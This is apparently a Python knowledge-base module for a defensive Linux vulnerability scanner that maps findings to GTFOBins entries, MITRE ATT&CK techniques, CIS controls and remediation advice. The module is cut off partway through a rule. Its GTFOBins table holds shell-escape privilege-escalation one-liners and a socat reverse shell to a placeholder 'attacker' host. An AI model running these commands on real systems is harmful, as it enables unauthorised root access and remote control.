"""Knowledge base and enrichment engine for VINA findings.

Provides structured rules, GTFOBins mappings, MITRE ATT&CK references,
and CIS Benchmark mappings for automatic finding enrichment.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

from ..models.findings import Finding

# =========================================================================
#  GTFOBins mapping
# =========================================================================

GTFOBINS_BINARIES: dict[str, dict[str, str]] = {
    "find": {
        "url": "https://gtfobins.github.io/gtfobins/find/",
        "technique": "find . -exec /bin/sh -p \\; -quit",
        "description": "Can execute arbitrary commands via -exec or -ok, bypassing restricted shells.",
    },
    "bash": {
        "url": "https://gtfobins.github.io/gtfobins/bash/",
        "technique": "bash -p or /bin/bash -p",
        "description": "Can spawn a privileged shell when SUID or capabilities are set.",
    },
    "sh": {
        "url": "https://gtfobins.github.io/gtfobins/sh/",
        "technique": "sh -p or /bin/sh -p",
        "description": "Can spawn a privileged shell when SUID or capabilities are set.",
    },
    "dash": {
        "url": "https://gtfobins.github.io/gtfobins/dash/",
        "technique": "dash -p or /bin/dash -p",
        "description": "Can spawn a privileged shell when SUID or capabilities are set.",
    },
    "tar": {
        "url": "https://gtfobins.github.io/gtfobins/tar/",
        "technique": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "description": "Can execute arbitrary commands via checkpoint-action or -I flag.",
    },
    "python3": {
        "url": "https://gtfobins.github.io/gtfobins/python/",
        "technique": "python3 -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Can execute arbitrary commands and spawn shells via os.system, subprocess, or ctypes.",
    },
    "python": {
        "url": "https://gtfobins.github.io/gtfobins/python/",
        "technique": "python -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Can execute arbitrary commands and spawn shells via os.system, subprocess, or ctypes.",
    },
    "perl": {
        "url": "https://gtfobins.github.io/gtfobins/perl/",
        "technique": "perl -e 'exec \"/bin/sh\";'",
        "description": "Can execute arbitrary commands and spawn shells via exec, system, or backticks.",
    },
    "nmap": {
        "url": "https://gtfobins.github.io/gtfobins/nmap/",
        "technique": "nmap --interactive or nmap --script=+\\\"os.execute('/bin/sh')\\\"",
        "description": "Can execute arbitrary commands via --interactive mode or NSE scripts.",
    },
    "vim": {
        "url": "https://gtfobins.github.io/gtfobins/vim/",
        "technique": "vim -c ':!/bin/sh'",
        "description": "Can spawn a shell via :! command within the editor.",
    },
    "less": {
        "url": "https://gtfobins.github.io/gtfobins/less/",
        "technique": "less /etc/passwd followed by !/bin/sh",
        "description": "Can execute commands via ! command within pager.",
    },
    "more": {
        "url": "https://gtfobins.github.io/gtfobins/more/",
        "technique": "more /etc/passwd followed by !/bin/sh",
        "description": "Can execute commands via ! command within pager.",
    },
    "awk": {
        "url": "https://gtfobins.github.io/gtfobins/awk/",
        "technique": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "description": "Can execute arbitrary commands via system() function.",
    },
    "openssl": {
        "url": "https://gtfobins.github.io/gtfobins/openssl/",
        "technique": "openssl req -engine /bin/sh",
        "description": "Can execute arbitrary commands via -engine flag when SUID.",
    },
    "git": {
        "url": "https://gtfobins.github.io/gtfobins/git/",
        "technique": "git -p help followed by !/bin/sh",
        "description": "Can spawn a shell via pager or hooks with SUID.",
    },
    "cp": {
        "url": "https://gtfobins.github.io/gtfobins/cp/",
        "technique": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh",
        "description": "Can copy and set SUID on files when running with elevated privileges.",
    },
    "mv": {
        "url": "https://gtfobins.github.io/gtfobins/mv/",
        "technique": "Use to overwrite restricted files (e.g., /etc/passwd)",
        "description": "Can overwrite arbitrary files by moving a writable file over them.",
    },
    "chmod": {
        "url": "https://gtfobins.github.io/gtfobins/chmod/",
        "technique": "chmod u+s /bin/sh",
        "description": "Can add SUID bit to binaries when running with elevated privileges.",
    },
    "socat": {
        "url": "https://gtfobins.github.io/gtfobins/socat/",
        "technique": "socat exec:'/bin/sh',pty,stderr TCP:attacker:4444",
        "description": "Can create reverse shells or bind shells via exec.",
    },
}


def _get_gtfo_bins_from_path(path: str) -> list[dict[str, str]]:
    """Look up GTFOBins entries for a given binary path."""
    if not path:
        return []
    binary = path.split("/")[-1].lower()
    entry = GTFOBINS_BINARIES.get(binary)
    if entry:
        return [{"binary": binary, **entry}]
    return []


def _get_gtfo_bins_from_cmd(cmd: str) -> list[dict[str, str]]:
    """Look up GTFOBins entries from a command string."""
    if not cmd:
        return []
    parts = cmd.split()
    if not parts:
        return []
    raw = parts[0]
    return _get_gtfo_bins_from_path(raw)


# =========================================================================
#  MITRE ATT&CK constants
# =========================================================================


class MitreTechnique:
    """Common MITRE ATT&CK technique IDs and names."""

    T1078 = "T1078 - Valid Accounts"
    T1098 = "T1098 - Account Manipulation"
    T1136 = "T1136 - Create Account"
    T1548_001 = "T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid"
    T1548_002 = "T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control"
    T1548_003 = "T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
    T1546_008 = "T1546.008 - Event Triggered Execution: Accessibility Features"
    T1053_003 = "T1053.003 - Scheduled Task/Job: Cron"
    T1053_005 = "T1053.005 - Scheduled Task/Job: Systemd Timers"
    T1055_001 = "T1055.001 - Process Injection: DLL Injection"
    T1068 = "T1068 - Exploitation for Privilege Escalation"
    T1070_004 = "T1070.004 - Indicator Removal: File Deletion"
    T1082 = "T1082 - System Information Discovery"
    T1083 = "T1083 - File and Directory Discovery"
    T1087 = "T1087 - Account Discovery"
    T1003 = "T1003 - OS Credential Dumping"
    T1003_001 = "T1003.001 - OS Credential Dumping: LSASS Memory"
    T1003_008 = "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
    T1110 = "T1110 - Brute Force"
    T1110_001 = "T1110.001 - Brute Force: Password Guessing"
    T1110_002 = "T1110.002 - Brute Force: Password Cracking"
    T1135 = "T1135 - Network Share Discovery"
    T1204_002 = "T1204.002 - User Execution: Malicious File"
    T1552_001 = "T1552.001 - Unsecured Credentials: Credentials In Files"
    T1552_002 = "T1552.002 - Unsecured Credentials: Credentials in Registry"
    T1552_004 = "T1552.004 - Unsecured Credentials: Private Keys"
    T1552_006 = "T1552.006 - Unsecured Credentials: Group Policy Preferences"
    T1555_003 = "T1555.003 - Credentials from Password Stores: Web Browser Credentials"
    T1562_001 = "T1562.001 - Impair Defenses: Disable or Modify Tools"
    T1562_004 = "T1562.004 - Impair Defenses: Disable or Modify System Firewall"
    T1563_001 = "T1563.001 - Remote Service Session Hijacking: SSH Hijacking"
    T1569_002 = "T1569.002 - System Services: Service Execution"
    T1574_001 = "T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking"
    T1574_002 = "T1574.002 - Hijack Execution Flow: DLL Side-Loading"
    T1611 = "T1611 - Escape to Host"
    T1059_004 = "T1059.004 - Command and Scripting Interpreter: Unix Shell"
    T1059_006 = "T1059.006 - Command and Scripting Interpreter: Python"
    T1059_007 = "T1059.007 - Command and Scripting Interpreter: Perl"
    T1059_002 = "T1059.002 - Command and Scripting Interpreter: AppleScript"
    T1202 = "T1202 - Indirect Command Execution"
    T1070 = "T1070 - Indicator Removal"
    T1021_004 = "T1021.004 - Remote Services: SSH"
    T1036 = "T1036 - Masquerading"
    T1036_003 = "T1036.003 - Masquerading: Rename System Utilities"


# =========================================================================
#  CIS Benchmark constants
# =========================================================================


class CisControl:
    """Common CIS Control references."""

    v8_01 = "CIS Control 1: Inventory and Control of Enterprise Assets"
    v8_02 = "CIS Control 2: Inventory and Control of Software Assets"
    v8_03 = "CIS Control 3: Data Protection"
    v8_04 = "CIS Control 4: Secure Configuration of Enterprise Assets and Software"
    v8_05 = "CIS Control 5: Account Management"
    v8_06 = "CIS Control 6: Access Control Management"
    v8_07 = "CIS Control 7: Continuous Vulnerability Management"
    v8_08 = "CIS Control 8: Audit Log Management"
    v8_09 = "CIS Control 9: Email and Web Browser Protections"
    v8_10 = "CIS Control 10: Malware Defenses"
    v8_11 = "CIS Control 11: Data Recovery"
    v8_12 = "CIS Control 12: Network Infrastructure Management"
    v8_13 = "CIS Control 13: Network Monitoring and Defense"
    v8_14 = "CIS Control 14: Security Awareness and Skills Training"
    v8_15 = "CIS Control 15: Service Provider Management"
    v8_16 = "CIS Control 16: Application Software Security"
    v8_17 = "CIS Control 17: Incident Response Management"
    v8_18 = "CIS Control 18: Penetration Testing"

    # CIS Distribution-specific benchmark references
    # Ubuntu / Debian Linux Benchmark
    ubuntu_1_1_1_1 = "CIS Ubuntu Benchmark 1.1.1.1 - Ensure mounting of cramfs modules is disabled"
    ubuntu_1_1_1_2 = "CIS Ubuntu Benchmark 1.1.1.2 - Ensure mounting of freevxfs modules is disabled"
    ubuntu_3_1_1 = "CIS Ubuntu Benchmark 3.1.1 - Ensure packet redirect sending is disabled"
    ubuntu_3_2_1 = "CIS Ubuntu Benchmark 3.2.1 - Ensure source routed packets are not accepted"
    ubuntu_3_2_2 = "CIS Ubuntu Benchmark 3.2.2 - Ensure ICMP redirects are not accepted"
    ubuntu_3_2_3 = "CIS Ubuntu Benchmark 3.2.3 - Ensure secure ICMP redirects are not accepted"
    ubuntu_3_2_4 = "CIS Ubuntu Benchmark 3.2.4 - Ensure suspicious packets are logged"
    ubuntu_3_2_5 = "CIS Ubuntu Benchmark 3.2.5 - Ensure broadcast ICMP requests are ignored"
    ubuntu_3_2_6 = "CIS Ubuntu Benchmark 3.2.6 - Ensure bogus ICMP responses are ignored"
    ubuntu_3_2_7 = "CIS Ubuntu Benchmark 3.2.7 - Ensure Reverse Path Filtering is enabled"
    ubuntu_3_2_8 = "CIS Ubuntu Benchmark 3.2.8 - Ensure TCP SYN Cookies is enabled"
    ubuntu_3_3_1 = "CIS Ubuntu Benchmark 3.3.1 - Ensure IPv6 router advertisements are not accepted"
    ubuntu_3_3_2 = "CIS Ubuntu Benchmark 3.3.2 - Ensure IPv6 redirects are not accepted"
    ubuntu_3_3_3 = "CIS Ubuntu Benchmark 3.3.3 - Ensure IPv6 is disabled"
    ubuntu_4_1_1_1 = "CIS Ubuntu Benchmark 4.1.1.1 - Ensure auditd is installed"
    ubuntu_4_1_1_2 = "CIS Ubuntu Benchmark 4.1.1.2 - Ensure auditd service is enabled"
    ubuntu_4_1_2_1 = "CIS Ubuntu Benchmark 4.1.2.1 - Ensure audit log storage size is configured"
    ubuntu_4_2_1_1 = "CIS Ubuntu Benchmark 4.2.1.1 - Ensure rsyslog is installed"
    ubuntu_4_2_1_2 = "CIS Ubuntu Benchmark 4.2.1.2 - Ensure rsyslog Service is enabled"
    ubuntu_5_1_1 = "CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running"
    ubuntu_5_2_1 = "CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed"
    ubuntu_5_2_2 = "CIS Ubuntu Benchmark 5.2.2 - Ensure sudo commands use pty"
    ubuntu_5_2_3 = "CIS Ubuntu Benchmark 5.2.3 - Ensure sudo log file exists"
    ubuntu_5_2_4 = "CIS Ubuntu Benchmark 5.2.4 - Ensure sudo authentication timeout is configured"
    ubuntu_5_3_1 = "CIS Ubuntu Benchmark 5.3.1 - Ensure permissions on /etc/ssh/sshd_config are configured"
    ubuntu_5_3_2 = "CIS Ubuntu Benchmark 5.3.2 - Ensure permissions on SSH private host key files are configured"
    ubuntu_5_3_3 = "CIS Ubuntu Benchmark 5.3.3 - Ensure permissions on SSH public host key files are configured"
    ubuntu_5_3_4 = "CIS Ubuntu Benchmark 5.3.4 - Ensure SSH LogLevel is appropriate"
    ubuntu_5_3_5 = "CIS Ubuntu Benchmark 5.3.5 - Ensure SSH X11 forwarding is disabled"
    ubuntu_5_3_6 = "CIS Ubuntu Benchmark 5.3.6 - Ensure SSH MaxAuthTries is 6 or less"
    ubuntu_5_3_7 = "CIS Ubuntu Benchmark 5.3.7 - Ensure SSH IgnoreRhosts is enabled"
    ubuntu_5_3_8 = "CIS Ubuntu Benchmark 5.3.8 - Ensure SSH HostbasedAuthentication is disabled"
    ubuntu_5_3_9 = "CIS Ubuntu Benchmark 5.3.9 - Ensure SSH root login is disabled"
    ubuntu_5_3_10 = "CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled"
    ubuntu_5_3_11 = "CIS Ubuntu Benchmark 5.3.11 - Ensure SSH PermitUserEnvironment is disabled"
    ubuntu_5_3_12 = "CIS Ubuntu Benchmark 5.3.12 - Ensure only strong Ciphers are used"
    ubuntu_5_3_13 = "CIS Ubuntu Benchmark 5.3.13 - Ensure only strong MAC algorithms are used"
    ubuntu_5_3_14 = "CIS Ubuntu Benchmark 5.3.14 - Ensure only strong Key Exchange algorithms are used"
    ubuntu_5_3_15 = "CIS Ubuntu Benchmark 5.3.15 - Ensure SSH Idle Timeout Interval is configured"
    ubuntu_5_3_16 = "CIS Ubuntu Benchmark 5.3.16 - Ensure SSH LoginGraceTime is set to one minute or less"
    ubuntu_5_3_17 = "CIS Ubuntu Benchmark 5.3.17 - Ensure SSH access is limited"
    ubuntu_5_3_18 = "CIS Ubuntu Benchmark 5.3.18 - Ensure SSH warning banner is configured"
    ubuntu_5_4_1_1 = "CIS Ubuntu Benchmark 5.4.1.1 - Ensure password creation requirements are configured"
    ubuntu_5_4_1_2 = "CIS Ubuntu Benchmark 5.4.1.2 - Ensure lockout for failed password attempts is configured"
    ubuntu_5_4_1_3 = "CIS Ubuntu Benchmark 5.4.1.3 - Ensure password hashing algorithm is up to date"
    ubuntu_5_4_1_4 = "CIS Ubuntu Benchmark 5.4.1.4 - Ensure password reuse is limited"
    ubuntu_5_4_2_1 = "CIS Ubuntu Benchmark 5.4.2.1 - Ensure account is locked after 35 days of inactivity"
    ubuntu_5_4_2_2 = "CIS Ubuntu Benchmark 5.4.2.2 - Ensure system accounts are non-login"
    ubuntu_5_4_3 = "CIS Ubuntu Benchmark 5.4.3 - Ensure default group for root is GID 0"
    ubuntu_5_4_4 = "CIS Ubuntu Benchmark 5.4.4 - Ensure default user umask is 027 or more restrictive"
    ubuntu_5_4_5 = "CIS Ubuntu Benchmark 5.4.5 - Ensure default user shell is restricted"
    ubuntu_6_1_1 = "CIS Ubuntu Benchmark 6.1.1 - Ensure permissions on /etc/passwd are configured"
    ubuntu_6_1_2 = "CIS Ubuntu Benchmark 6.1.2 - Ensure permissions on /etc/passwd- are configured"
    ubuntu_6_1_3 = "CIS Ubuntu Benchmark 6.1.3 - Ensure permissions on /etc/shadow are configured"
    ubuntu_6_1_4 = "CIS Ubuntu Benchmark 6.1.4 - Ensure permissions on /etc/shadow- are configured"
    ubuntu_6_1_5 = "CIS Ubuntu Benchmark 6.1.5 - Ensure permissions on /etc/group are configured"
    ubuntu_6_1_6 = "CIS Ubuntu Benchmark 6.1.6 - Ensure permissions on /etc/group- are configured"
    ubuntu_6_1_7 = "CIS Ubuntu Benchmark 6.1.7 - Ensure permissions on /etc/gshadow are configured"
    ubuntu_6_1_8 = "CIS Ubuntu Benchmark 6.1.8 - Ensure permissions on /etc/gshadow- are configured"
    ubuntu_6_1_9 = "CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist"
    ubuntu_6_1_10 = "CIS Ubuntu Benchmark 6.1.10 - Ensure no unowned files or directories exist"
    ubuntu_6_1_11 = "CIS Ubuntu Benchmark 6.1.11 - Ensure no ungrouped files or directories exist"
    ubuntu_6_2_1 = "CIS Ubuntu Benchmark 6.2.1 - Ensure password fields are not empty"
    ubuntu_6_2_2 = "CIS Ubuntu Benchmark 6.2.2 - Ensure all groups in /etc/passwd exist in /etc/group"
    ubuntu_6_2_3 = "CIS Ubuntu Benchmark 6.2.3 - Ensure no duplicate UIDs exist"
    ubuntu_6_2_4 = "CIS Ubuntu Benchmark 6.2.4 - Ensure no duplicate GIDs exist"
    ubuntu_6_2_5 = "CIS Ubuntu Benchmark 6.2.5 - Ensure no duplicate user names exist"
    ubuntu_6_2_6 = "CIS Ubuntu Benchmark 6.2.6 - Ensure no duplicate group names exist"
    ubuntu_6_2_7 = "CIS Ubuntu Benchmark 6.2.7 - Ensure root is the only UID 0 account"
    ubuntu_6_2_8 = "CIS Ubuntu Benchmark 6.2.8 - Ensure root PATH Integrity"


# =========================================================================
#  Knowledge rules
# =========================================================================


@dataclass(slots=True)
class KnowledgeRule:
    """A structured knowledge-base rule for enriching findings.

    Rules are matched against findings by checking whether any of the
    ``title_patterns`` appear (case-insensitive) in the finding title.
    """

    rule_id: str
    title_patterns: list[str]
    explanation: str
    security_impact: str
    remediation: str
    references: list[str] = field(default_factory=list)
    cis_control: str = ""
    mitre_attack: list[str] = field(default_factory=list)
    cwe: str = ""
    tags: list[str] = field(default_factory=list)
    confidence_score: float = 0.8
    source_stages: list[str] | None = None
    source_categories: list[str] | None = None


# ------------------------------------------------------------------
#  OS / Privilege escalation rules
# ------------------------------------------------------------------

PRIVILEGE_ESCALATION_RULES = [
    KnowledgeRule(
        rule_id="PE-001",
        title_patterns=["NOPASSWD sudo: ALL commands"],
        explanation="A user can execute ALL commands via sudo without providing a password. "
        "This grants unrestricted root access to anyone who has access to that user account.",
        security_impact="Critical - Complete system compromise. Any process or user with access "
        "to this account can gain immediate root access without authentication.",
        remediation="Remove the NOPASSWD tag from the sudoers ALL entry. "
        "Use: sudo visudo and change the rule to require password authentication. "
        "Better: grant only specific commands rather than ALL.",
        cis_control="CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed",
        mitre_attack=[MitreTechnique.T1548_003],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["sudo", "privilege-escalation", "authentication"],
        confidence_score=0.95,
    ),
    KnowledgeRule(
        rule_id="PE-002",
        title_patterns=["NOPASSWD sudo: specific commands"],
        explanation="A user can execute specific commands via sudo without a password. "
        "Many common commands (vim, less, tar, find, python, perl) allow shell escape "
        "which would grant root access despite being restricted to specific commands.",
        security_impact="High - Likely privilege escalation. Commands like vim, less, find, "
        "tar, python, and perl all have known shell-escape techniques that bypass restrictions.",
        remediation="Review each NOPASSWD command for shell-escape potential. "
        "Add password requirement unless absolutely necessary. "
        "Consider using 'sudo -l' to audit current rules.",
        cis_control="CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed",
        mitre_attack=[MitreTechnique.T1548_003],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["sudo", "privilege-escalation", "nopasswd"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="PE-003",
        title_patterns=["Password sudo: ALL commands"],
        explanation="A user can execute ALL commands via sudo with password authentication. "
        "While better than passwordless, this still means anyone who knows the user's password "
        "has unrestricted root access.",
        security_impact="High - Full root access for anyone with the user's password. "
        "Also exploitable if the password is weak, reused, or compromised.",
        remediation="Restrict sudo to only the specific commands needed. "
        "Remove the ALL wildcard and grant individual commands.",
        cis_control="CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed",
        mitre_attack=[MitreTechnique.T1548_003],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["sudo", "privilege-escalation", "all"],
        confidence_score=0.75,
    ),
    KnowledgeRule(
        rule_id="PE-004",
        title_patterns=["SUID binary"],
        explanation="A binary with the SUID bit set runs with the permissions of its owner "
        "(typically root), regardless of who executes it. This is a common privilege escalation vector.",
        security_impact="High to Medium - Depending on the binary. Well-known SUID binaries "
        "like pkexec, sudo, and mount have known escalation paths.",
        remediation="Remove the SUID bit if not required: chmod u-s <path>. "
        "For binaries that genuinely need SUID, ensure they are regularly patched "
        "and monitored for CVEs.",
        references=["https://gtfobins.github.io/"],
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["suid", "privilege-escalation", "binary"],
        confidence_score=0.8,
    ),
]

# ------------------------------------------------------------------
#  Capability rules
# ------------------------------------------------------------------

CAPABILITY_RULES = [
    KnowledgeRule(
        rule_id="CAP-001",
        title_patterns=["Capability:"],
        explanation="File capabilities grant specific root-level privileges to binaries "
        "without full SUID. Capabilities like cap_setuid, cap_dac_override, "
        "and cap_sys_admin can be used for privilege escalation.",
        security_impact="High - Capabilities like cap_setuid+ep effectively grant root access. "
        "cap_dac_override bypasses all file permission checks.",
        remediation="Review each capability assignment. Remove unnecessary capabilities: "
        "setcap -r <path>. Use the principle of least privilege.",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["capabilities", "privilege-escalation", "linux-capabilities"],
        confidence_score=0.8,
    ),
]

# ------------------------------------------------------------------
#  SSH configuration rules
# ------------------------------------------------------------------

SSH_RULES = [
    KnowledgeRule(
        rule_id="SSH-001",
        title_patterns=["SSH root login is permitted"],
        explanation="SSH allows direct root login. This bypasses audit trails since "
        "root actions are not attributed to specific users, and it exposes "
        "the most privileged account to the network.",
        security_impact="High - Direct root SSH access means attackers only need "
        "the root password (or key) to gain full control. Brute force attempts "
        "on root are common.",
        remediation="Set 'PermitRootLogin no' (or 'prohibit-password') in /etc/ssh/sshd_config. "
        "Use sudo for privilege escalation instead.",
        cis_control="CIS Ubuntu Benchmark 5.3.9 - Ensure SSH root login is disabled",
        mitre_attack=[MitreTechnique.T1021_004, MitreTechnique.T1078],
        cwe="CWE-287: Improper Authentication",
        tags=["ssh", "authentication", "root"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="SSH-002",
        title_patterns=["SSH password authentication is enabled"],
        explanation="SSH password authentication allows login with username and password. "
        "This is susceptible to brute-force attacks and credential stuffing.",
        security_impact="Medium - Password authentication increases the attack surface. "
        "Standard mitigation: use SSH keys only (public key authentication).",
        remediation="Set 'PasswordAuthentication no' in /etc/ssh/sshd_config. "
        "Ensure all users have SSH key pairs configured before disabling passwords.",
        cis_control="CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled",
        mitre_attack=[MitreTechnique.T1110, MitreTechnique.T1021_004],
        cwe="CWE-308: Use of Single-factor Authentication",
        tags=["ssh", "authentication", "password"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SSH-003",
        title_patterns=["SSH password authentication is disabled"],
        explanation="Password authentication is disabled for SSH, which is a security best practice. "
        "Only key-based authentication is allowed.",
        security_impact="Info - This is a positive finding. SSH key-only authentication "
        "reduces the attack surface against credential brute-forcing.",
        remediation="Maintain this configuration. Ensure SSH keys are properly managed and rotated.",
        cis_control="CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled",
        mitre_attack=[MitreTechnique.T1021_004],
        cwe="",
        tags=["ssh", "authentication", "secure"],
        confidence_score=0.5,
    ),
    KnowledgeRule(
        rule_id="SSH-004",
        title_patterns=["SSH public key authentication is enabled"],
        explanation="Public key authentication is enabled for SSH, allowing key-based login. "
        "This is more secure than password authentication when keys are properly protected.",
        security_impact="Info - Positive finding. Key-based auth is recommended over passwords.",
        remediation="Ensure keys are protected with strong passphrases and stored securely.",
        cis_control="CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled",
        tags=["ssh", "authentication", "public-key"],
        confidence_score=0.5,
    ),
]

# ------------------------------------------------------------------
#  Docker rules
# ------------------------------------------------------------------

DOCKER_RULES = [
    KnowledgeRule(
        rule_id="DOCKER-001",
        title_patterns=["Docker socket is world-writable"],
        explanation="The Docker socket (/var/run/docker.sock) is world-writable, "
        "allowing any user on the system to execute Docker commands. "
        "Since Docker runs as root, this is equivalent to full root access.",
        security_impact="Critical - Complete root compromise. Any user can create "
        "a privileged container with host filesystem access.",
        remediation="chmod 660 /var/run/docker.sock && chown root:docker /var/run/docker.sock. "
        "Only the root user and docker group should have access.",
        cis_control="CIS Control 6: Access Control Management",
        mitre_attack=[MitreTechnique.T1611],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["docker", "container", "privilege-escalation", "socket"],
        confidence_score=0.95,
    ),
    KnowledgeRule(
        rule_id="DOCKER-002",
        title_patterns=["Users in docker group"],
        explanation="Users in the docker group can execute Docker commands, which effectively "
        "grants root-level access. Docker access can be used to mount the host filesystem "
        "and execute commands as root.",
        security_impact="High - Docker group membership is equivalent to root access. "
        "Members can create containers with --privileged and -v /:/host.",
        remediation="Remove users from the docker group unless absolutely necessary. "
        "Use: gpasswd -d <user> docker. Review if sudo-based Docker access is sufficient.",
        cis_control="CIS Control 5: Account Management",
        mitre_attack=[MitreTechnique.T1611],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["docker", "group", "privilege-escalation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="DOCKER-003",
        title_patterns=["Privileged container:"],
        explanation="A container is running in privileged mode, which removes all container "
        "isolation features. The container has full access to the host system, "
        "including all devices and kernel capabilities.",
        security_impact="High - A compromised privileged container means full host compromise. "
        "Privileged containers can access host devices, mount filesystems, and load kernel modules.",
        remediation="Avoid --privileged flag. Use specific --cap-add and --device flags "
        "to grant only the capabilities actually needed.",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1611],
        cwe="CWE-250: Execution with Unnecessary Privileges",
        tags=["docker", "container", "privileged", "privilege-escalation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="DOCKER-004",
        title_patterns=["Docker is installed"],
        explanation="Docker is installed on the system. This is informational - "
        "Docker itself is not a vulnerability, but its presence expands the attack surface.",
        security_impact="Info - Docker provides additional attack surface through "
        "containers, images, and the Docker API.",
        remediation="Ensure Docker is kept up to date. Restrict access to the docker group. "
        "Enable Docker Content Trust and use signed images.",
        tags=["docker", "container", "service"],
        confidence_score=0.3,
    ),
]

# ------------------------------------------------------------------
#  Kernel and sysctl rules
# ------------------------------------------------------------------

KERNEL_RULES = [
    KnowledgeRule(
        rule_id="KERNEL-001",
        title_patterns=["ASLR is disabled"],
        explanation="ASLR (Address Space Layout Randomization) randomizes memory addresses "
        "to prevent exploitation of memory corruption vulnerabilities. "
        "When disabled, attackers can predict memory layouts and exploit buffer overflows more easily.",
        security_impact="High - Significantly increases exploit success rate. "
        "Bypasses ASLR-based protection for stack, heap, and library addresses.",
        remediation="Enable ASLR: sysctl -w kernel.randomize_va_space=2. "
        "Persist by adding 'kernel.randomize_va_space = 2' to /etc/sysctl.conf or /etc/sysctl.d/",
        cis_control="CIS Ubuntu Benchmark 1.5.1 - Ensure address space layout randomization (ASLR) is enabled",
        mitre_attack=[MitreTechnique.T1068],
        cwe="CWE-754: Improper Check for Unusual or Exceptional Conditions",
        tags=["aslr", "kernel", "exploit-mitigation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="KERNEL-002",
        title_patterns=["ASLR is enabled"],
        explanation="ASLR is enabled with full randomization (randomize_va_space=2). "
        "This is a security best practice that makes memory corruption exploits more difficult.",
        security_impact="Info - Positive finding. ASLR helps protect against buffer overflow and ROP exploits.",
        remediation="Maintain this configuration. Verify it persists across reboots.",
        tags=["aslr", "kernel", "exploit-mitigation"],
        confidence_score=0.5,
    ),
    KnowledgeRule(
        rule_id="KERNEL-003",
        title_patterns=["expected"],
        explanation="A kernel sysctl parameter is set to a non-recommended value, "
        "reducing the system's security posture.",
        security_impact="Medium - Depending on the specific sysctl. IP forwarding, "
        "accepting redirects, or disabled reverse-path filtering can enable "
        "network-based attacks.",
        remediation="Set the sysctl to the recommended value: "
        "sysctl -w <key>=<expected>. Add the setting to /etc/sysctl.d/ for persistence.",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1562_001],
        cwe="CWE-754: Improper Check for Unusual or Exceptional Conditions",
        tags=["kernel", "sysctl", "misconfiguration"],
        confidence_score=0.75,
        source_stages=["kernel"],
        source_categories=["security_control"],
    ),
]

# ------------------------------------------------------------------
#  Writable path / file rules
# ------------------------------------------------------------------

WRITABLE_RULES = [
    KnowledgeRule(
        rule_id="WRITABLE-001",
        title_patterns=["Writable PATH entries"],
        explanation="World-writable directories in the system PATH allow an attacker "
        "who can write to those directories to place malicious executables that will "
        "be executed before the legitimate system binaries.",
        security_impact="High - Any user who can write to a PATH directory can execute "
        "arbitrary code as any user who runs a command from that PATH. "
        "Common privilege escalation vector.",
        remediation="Remove write permissions from PATH directories or remove them from PATH. "
        "Ensure user PATH does not include world-writable directories before system paths.",
        cis_control="CIS Ubuntu Benchmark 6.2.8 - Ensure root PATH Integrity",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-426: Untrusted Search Path",
        tags=["path", "writable", "privilege-escalation", "environment"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-002",
        title_patterns=["Writable files in /etc/cron."],
        explanation="Cron script directories contain world-writable files. "
        "An attacker who can modify a cron script will have it executed automatically "
        "with the privileges of the scheduled user (often root).",
        security_impact="High - World-writable cron files allow privilege escalation. "
        "Any script run as root can be modified to execute arbitrary code.",
        remediation="chmod 644 <file> && chown root:root <file> for each writable cron file. "
        "Ensure all cron directories are owned by root and not world-writable.",
        cis_control="CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running",
        mitre_attack=[MitreTechnique.T1053_003],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["cron", "writable", "privilege-escalation", "scheduled-task"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-003",
        title_patterns=["Writable systemd unit"],
        explanation="Systemd unit files are world-writable, allowing any user "
        "to modify service configurations. Modified services run with their "
        "configured privileges (often root).",
        security_impact="High - Any user can modify a systemd service to execute "
        "arbitrary code as the service user (often root).",
